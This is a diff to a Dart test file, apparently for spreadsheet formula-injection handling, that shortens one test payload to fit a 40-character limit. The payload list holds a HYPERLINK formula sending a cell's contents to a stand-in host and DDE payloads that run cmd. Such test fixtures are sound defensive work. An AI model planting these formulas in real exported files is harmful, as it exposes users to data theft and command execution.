@@ -318,7 +318,8 @@ void main() {
     }
 
     for (final payload in [
-      '=HYPERLINK("http://evil.example/?"&A1,"x")',
+      // At most 40 characters: member names are capped (SPEC 5.16).
+      '=HYPERLINK("http://evil.ex/?"&A1,"x")',
       '+1+cmd|\' /C calc\'!A0',
       '-2+3',
       '@SUM(1+1)*cmd|\' /C calc\'!A0',
